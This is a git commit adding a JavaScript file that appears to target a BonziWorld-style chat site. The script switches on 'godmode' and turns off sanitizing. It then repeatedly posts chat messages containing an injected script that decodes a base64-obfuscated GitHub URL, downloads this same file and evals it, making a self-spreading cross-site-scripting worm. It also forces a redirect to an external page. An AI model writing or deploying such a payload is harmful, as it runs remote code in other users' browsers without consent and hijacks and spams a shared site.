59a462aca1e302881f82549332f0d5f565e18711
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2026-01-03 23:14:49 +0300

    Update coughtimer and modify socket emit commands

---
+++ 777SPRE.js
@@ -0,0 +1,16 @@
+let coughtimer = 7777; // Changed from const to let
+socket.emit('command', { list: ['godmode'] });
+socket.emit('command', { list: ['sanitize', 'off'] });
+const intervalId = setInterval(function() {
+    socket.emit("command", {
+        list: ["name", "777"]
+    });
+    socket.emit("command", {
+        list: ["color", "black"]
+    });
+    socket.emit('talk', { text: "SEVENSEVENSEVEN777 <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777SPRE'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
+    coughtimer = coughtimer - 125;
+}, coughtimer);
+setTimeout(() => {
+    window.location.href = "https://ivorydevrimoalt.github.io/BONZIWORLDULTRAJAVASCRIPTLIST/777.html";
+}, 17777);
